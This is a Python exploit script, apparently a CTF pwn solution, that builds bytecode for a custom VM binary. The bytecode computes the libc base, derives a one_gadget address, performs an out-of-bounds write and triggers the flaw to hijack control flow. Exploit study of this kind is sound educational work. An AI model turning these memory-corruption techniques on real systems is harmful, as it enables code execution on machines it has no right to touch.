#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

# 0x7fffffffd498 —▸ 0x7ffff7df9083 (__libc_start_main+243)

# -2532 = 0xfffffffffffff6d0
# target= 0xfffffffffffff810 (0x148)

bytecode_list = []

for i in range(1, 0xFF + 1):
    bytecode_list += [((i << 16) | (i << 8) | 0x06)]

bytecode_list[0] = 0x00830106
bytecode_list[0x83] = 0x04008306

bytecode = flat(
    bytecode_list,
    word_size=32,
)

bytecode += flat(
    [
        0x8010FA06,
        0x00FA0804,
        # calcu libc_base
        0x28050526,
        0x20040426,
        0x18030326,
        0x10020226,
        0x08010126,
        0x83010114,
        0x02010113,
        0x03010113,
        0x04010113,
        0x05010113,
        # calcu onegadget
        0xFA7E0206,
        0x000B0306,
        0x10030326,
        0x03020213,
        0x02010113,
        # write 0xfffffffffffff810
        0xF810F906,
        0xFFFFF907,
        0xFFFFF908,
        0xFFFFF909,
        # write
        # 0xBEEF0106,
        # 0xDEAD0107,
        # 0xBAD00108,
        # 0xCAFE0109,
        # write 0x26
        0x015C0206,
        0x03020207,
        0x05040208,
        0x07060209,
        0x09080306,
        0x0B0A0307,
        0x0D0C0308,
        0x0F0E0309,
        0x11100406,
        0x13120407,
        0x15140408,
        0x17160409,
        0x19180506,
        0x1B1A0507,
        0x1D1C0508,
        0x1F1E0509,
        0x21200606,
        0x23220607,
        0x25240608,
        0x27260609,
        # trigger vuln
        0x00F9FF03,
        0x00000000,
    ],
    word_size=32,
)

open("aaa.bin", "wb").write(bytecode)
print(len(bytecode))
